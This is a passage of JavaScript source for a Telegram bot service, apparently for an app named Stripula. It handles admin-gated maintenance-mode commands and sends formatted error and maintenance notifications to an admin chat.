            'AUD': 'A$', 'CAD': 'C$', 'CHF': 'Fr', 'HKD': 'HK$', 'SGD': 'S$',
            'INR': '₹', 'BRL': 'R$', 'MXN': 'Mex$', 'KRW': '₩', 'RUB': '₽',
            'SEK': 'kr', 'NOK': 'kr', 'DKK': 'kr', 'PLN': 'zł', 'THB': '฿',
            'MYR': 'RM', 'IDR': 'Rp', 'PHP': '₱', 'VND': '₫', 'TRY': '₺',
            'ZAR': 'R', 'NZD': 'NZ$', 'AED': 'د.إ', 'SAR': '﷼', 'ILS': '₪'
        };
        return symbols[currency?.toUpperCase()] || '';
    }
    // ==================== Maintenance Command Methods ====================

    /**
     * Set the maintenance service reference for command handling
     * 
     * @param {MaintenanceService} maintenanceService - The maintenance service instance
     */
    setMaintenanceService(maintenanceService) {
        this.maintenanceService = maintenanceService;
    }

    /**
     * Set the supabase client for admin validation
     * 
     * @param {Object} supabase - Supabase client instance
     */
    setSupabase(supabase) {
        this.supabase = supabase;
    }

    /**
     * Handle incoming maintenance commands from Telegram
     * 
     * Requirements: 8.1, 8.2, 8.3, 8.4, 8.5, 8.6
     * 
     * Commands:
     * - /maintenance_on [reason] - Enable maintenance mode
     * - /maintenance_off - Disable maintenance mode
     * - /maintenance_status - Get current maintenance status
     * 
     * @param {string} command - The command (maintenance_on, maintenance_off, maintenance_status)
     * @param {string} args - Command arguments (e.g., maintenance reason)
     * @param {string|number} fromUserId - Telegram user ID of the sender
     * @returns {Promise<{success: boolean, message: string}>}
     */
    async handleMaintenanceCommand(command, args, fromUserId) {
        // Requirement 8.6: Validate admin status before executing any command
        const isAdmin = await this._isAdminUser(fromUserId);
        
        // Requirement 8.5: Ignore commands from non-admin users
        if (!isAdmin) {
            console.log(`[TelegramBot] Maintenance command from non-admin user ${fromUserId} ignored`);
            return { 
                success: false, 
                message: 'Unauthorized: Only administrators can execute maintenance commands.' 
            };
        }

        // Check if maintenance service is available
        if (!this.maintenanceService) {
            console.error('[TelegramBot] MaintenanceService not configured');
            return { 
                success: false, 
                message: 'Error: Maintenance service not available.' 
            };
        }

        const normalizedCommand = command.toLowerCase().replace(/^\//, '');

        switch (normalizedCommand) {
            case 'maintenance_on': {
                // Requirement 8.1, 8.4: Enable maintenance mode with optional reason
                const reason = args?.trim() || null;
                
                try {
                    const result = await this.maintenanceService.setMaintenance(true, {
                        reason,
                        adminId: null, // We don't have the internal user ID from Telegram
                        adminName: `Telegram User ${fromUserId}`
                    });

                    if (result.success) {
                        const reasonText = reason ? `\nReason: ${reason}` : '';
                        return {
                            success: true,
                            message: `✅ Maintenance mode ENABLED${reasonText}`
                        };
                    } else {
                        return {
                            success: false,
                            message: '❌ Failed to enable maintenance mode.'
                        };
                    }
                } catch (err) {
                    console.error('[TelegramBot] Error enabling maintenance:', err.message);
                    return {
                        success: false,
                        message: `❌ Error: ${err.message}`
                    };
                }
            }

            case 'maintenance_off': {
                // Requirement 8.2: Disable maintenance mode
                try {
                    const result = await this.maintenanceService.setMaintenance(false, {
                        adminName: `Telegram User ${fromUserId}`
                    });

                    if (result.success) {
                        return {
                            success: true,
                            message: '✅ Maintenance mode DISABLED. System is now accessible.'
                        };
                    } else {
                        return {
                            success: false,
                            message: '❌ Failed to disable maintenance mode.'
                        };
                    }
                } catch (err) {
                    console.error('[TelegramBot] Error disabling maintenance:', err.message);
                    return {
                        success: false,
                        message: `❌ Error: ${err.message}`
                    };
                }
            }

            case 'maintenance_status': {
                // Requirement 8.3: Report current maintenance state
                try {
                    const status = this.maintenanceService.getStatus();
                    
                    if (status.enabled) {
                        const parts = ['🔧 Maintenance mode is <b>ENABLED</b>'];
                        
                        if (status.reason) {
                            parts.push(`\n📝 Reason: ${status.reason}`);
                        }
                        
                        if (status.enabledAt) {
                            const enabledTime = new Date(status.enabledAt).toLocaleString('en-US', {
                                timeZone: 'UTC',
                                month: 'short',
                                day: '2-digit',
                                hour: '2-digit',
                                minute: '2-digit',
                                hour12: false
                            });
                            parts.push(`\n🕐 Since: ${enabledTime} UTC`);
                        }
                        
                        if (status.estimatedEndTime) {
                            const endTime = new Date(status.estimatedEndTime).toLocaleString('en-US', {
                                timeZone: 'UTC',
                                month: 'short',
                                day: '2-digit',
                                hour: '2-digit',
                                minute: '2-digit',
                                hour12: false
                            });
                            parts.push(`\n⏰ Estimated end: ${endTime} UTC`);
                        }
                        
                        return {
                            success: true,
                            message: parts.join('')
                        };
                    } else {
                        return {
                            success: true,
                            message: '✅ Maintenance mode is <b>DISABLED</b>. System is operational.'
                        };
                    }
                } catch (err) {
                    console.error('[TelegramBot] Error getting maintenance status:', err.message);
                    return {
                        success: false,
                        message: `❌ Error: ${err.message}`
                    };
                }
            }

            default:
                return {
                    success: false,
                    message: `Unknown command: ${command}`
                };
        }
    }

    /**
     * Notify about errors (for direct error notifications)
     * 
     * Requirements: 6.4, 6.5
     * 
     * @param {Object} params - Error details
     * @param {string} params.errorId - Unique error reference ID
     * @param {string} params.message - Error message
     * @param {string} params.stack - Stack trace
     * @param {string} params.path - Request path
     * @param {string} params.userId - User ID (if authenticated)
     * @param {string} params.timestamp - ISO timestamp
     */
    async notifyError({ errorId, message, stack, path, userId, timestamp }) {
        if (!this.enabled || !this.adminChatId) return;

        // Format timestamp for display
        const displayTime = timestamp 
            ? new Date(timestamp).toLocaleString('en-US', {
                timeZone: 'UTC',
                month: 'short',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            })
            : new Date().toLocaleString('en-US', {
                timeZone: 'UTC',
                month: 'short',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });

        // Truncate stack trace if too long (Telegram has 4096 char limit)
        const maxStackLength = 1200;
        const truncatedStack = stack && stack.length > maxStackLength
            ? stack.substring(0, maxStackLength) + '\n... (truncated)'
            : stack || 'No stack trace available';

        // Escape HTML special characters
        const escapeHtml = (text) => {
            if (!text) return '';
            return String(text)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
        };

        const formattedMessage = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🚨 <b>APPLICATION ERROR</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🆔 <b>Error ID:</b> <code>${errorId || 'N/A'}</code>

❌ <b>Error:</b>
<code>${escapeHtml(message || 'Unknown error')}</code>

┌─────────────────────
│ 📍 <b>Path:</b> ${path || 'N/A'}
│ 👤 <b>User:</b> ${userId ? `<code>${userId}</code>` : 'Anonymous'}
│ 🕐 <b>Time:</b> ${displayTime} UTC
└─────────────────────

📋 <b>Stack Trace:</b>
<pre>${escapeHtml(truncatedStack)}</pre>

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀
`.trim();

        // Send to admin channel
        this.sendMessage(this.adminChatId, formattedMessage);
    }

    /**
     * Notify about maintenance mode changes
     * 
     * Requirements: 1.2, 1.5
     * 
     * @param {Object} params - Maintenance change details
     * @param {boolean} params.enabled - Whether maintenance is now enabled
     * @param {string} params.reason - Maintenance reason (if enabled)
     * @param {string} params.adminName - Name of admin who made the change
     * @param {string} params.timestamp - ISO timestamp of the change
     */
    async notifyMaintenanceChange({ enabled, reason, adminName, timestamp }) {
        if (!this.enabled || !this.adminChatId) return;

        // Format timestamp for display
        const displayTime = timestamp 
            ? new Date(timestamp).toLocaleString('en-US', {
                timeZone: 'UTC',
                month: 'short',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                hour12: false
            })
            : new Date().toLocaleString('en-US', {
                timeZone: 'UTC',
                month: 'short',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                hour12: false
            });

        const statusEmoji = enabled ? '🔧' : '✅';
        const statusText = enabled ? 'ENABLED' : 'DISABLED';
        const headerEmoji = enabled ? '⚠️' : '🟢';

        let formattedMessage = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
${headerEmoji} <b>MAINTENANCE ${statusText}</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

${statusEmoji} Maintenance mode is now <b>${statusText}</b>`;

        if (enabled && reason) {
            formattedMessage += `\n\n📝 <b>Reason:</b>\n${reason}`;
        }

        formattedMessage += `

┌─────────────────────
│ 👤 <b>Admin:</b> ${adminName || 'System'}
│ 🕐 <b>Time:</b> ${displayTime} UTC
└─────────────────────

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀`;

        // Send to admin channel
        this.sendMessage(this.adminChatId, formattedMessage.trim());
    }

    /**
     * Validate if a Telegram user is an admin
     * 
     * Requirement: 8.6 - Validate admin status before executing any maintenance command
     * 
     * Checks the database for a user with matching telegram_id and is_admin = true
     * 
     * @param {string|number} telegramId - Telegram user ID
     * @returns {Promise<boolean>} True if user is an admin
     * @private
     */
    async _isAdminUser(telegramId) {
        if (!telegramId) {
            return false;
        }

        // If no supabase client, check against admin chat ID as fallback
        if (!this.supabase) {
            // Fallback: Check if the user is the admin chat ID
            if (this.adminChatId && String(telegramId) === String(this.adminChatId)) {
                return true;
            }
            console.warn('[TelegramBot] Supabase not configured for admin validation');
            return false;
        }

        try {
            const { data, error } = await this.supabase
                .from('users')
                .select('id, is_admin')
                .eq('telegram_id', String(telegramId))
                .single();

            if (error) {
                if (error.code === 'PGRST116') {
                    // No user found with this telegram_id
                    console.log(`[TelegramBot] No user found with telegram_id: ${telegramId}`);
                    return false;
                }
                console.error('[TelegramBot] Error checking admin status:', error.message);
                return false;
            }

            return data?.is_admin === true;
        } catch (err) {
            console.error('[TelegramBot] Failed to validate admin status:', err.message);
            return false;
        }
    }
}

export default TelegramBotService;
